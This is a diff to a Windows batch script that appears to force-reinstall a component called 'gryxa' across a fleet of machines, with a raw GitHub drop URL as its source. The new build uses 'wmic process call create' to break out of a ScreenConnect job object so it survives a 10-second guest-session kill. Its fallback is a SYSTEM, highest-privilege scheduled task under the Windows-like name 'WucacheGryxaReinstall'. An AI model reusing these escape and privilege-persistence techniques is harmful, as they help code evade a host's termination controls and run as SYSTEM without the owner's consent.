@@ -1,7 +1,7 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F6 - fleet REINSTALL via schtasks (survives sevrz 10s kill)
-rem F6: schedule SYSTEM one-shot — start /b dies with Guest session.
-rem F5: keep G5 own_gryxa; never overwrite with older pin.
+rem OWN_GRYXA_FORCE BUILD 20260804F7 - fleet REINSTALL via wmic (survives sevrz 10s; schtasks Queued is broken)
+rem F7: wmic process call create SYSTEM-equivalent breakaway. schtasks ONCE often stays Queued.
+rem F6: schtasks attempt. F5: keep G5.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -16,7 +16,7 @@ set "LOG=%WD%\own_gryxa_force.log"
 set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
 set "TASK=WucacheGryxaReinstall"
-set "BUILD=F6"
+set "BUILD=F7"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -63,20 +63,38 @@ if not errorlevel 1 (
 )
 
 if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
+schtasks /Delete /TN "%TASK%" /F >nul 2>&1
 
 > "%WORKER%" (
   echo @echo off
-  echo echo [%DATE% %TIME%] schtask_reinstall_begin^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] wmic_reinstall_begin^>^>"%LOG%"
   echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
-  echo echo [%DATE% %TIME%] schtask_reinstall_done^>^>"%LOG%"
-  echo schtasks /Delete /TN "%TASK%" /F ^>nul 2^>^&1
+  echo echo [%DATE% %TIME%] wmic_reinstall_done err=%%ERRORLEVEL%%^>^>"%LOG%"
 )
 
-schtasks /Delete /TN "%TASK%" /F >nul 2>&1
-schtasks /Create /TN "%TASK%" /TR "cmd.exe /c call \"%WORKER%\"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
-schtasks /Run /TN "%TASK%" >nul 2>&1
-set "ACTION=scheduled-reinstall"
-echo [%DATE% %TIME%] scheduled REINSTALL task=%TASK% pre=%PRE%>>"%LOG%"
+rem breakaway from ScreenConnect job object — survives 10s Guest kill
+wmic process call create "cmd.exe /c call \"%WORKER%\"" >"%STAGE%\wmic_create.out" 2>&1
+findstr /I "ProcessId" "%STAGE%\wmic_create.out" >nul
+if errorlevel 1 (
+  rem fallback: schtasks with near-future ST + Run
+  for /f "tokens=1-2 delims=:" %%A in ("%TIME%") do (
+    set /a H=%%A
+    set /a M=1%%B-100+2
+  )
+  if !M! GEQ 60 (
+    set /a M-=60
+    set /a H+=1
+  )
+  if !H! GEQ 24 set /a H=0
+  if !H! LSS 10 (set "HH=0!H!") else (set "HH=!H!")
+  if !M! LSS 10 (set "MM=0!M!") else (set "MM=!M!")
+  schtasks /Create /TN "%TASK%" /TR "cmd.exe /c call \"%WORKER%\"" /SC ONCE /ST !HH!:!MM! /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+  schtasks /Run /TN "%TASK%" >nul 2>&1
+  set "ACTION=schtasks-fallback"
+) else (
+  set "ACTION=wmic-reinstall"
+)
+echo [%DATE% %TIME%] launched ACTION=!ACTION! pre=%PRE%>>"%LOG%"
 
 set "STATE=ABSENT"
 sc query "%SVC%" >nul 2>&1
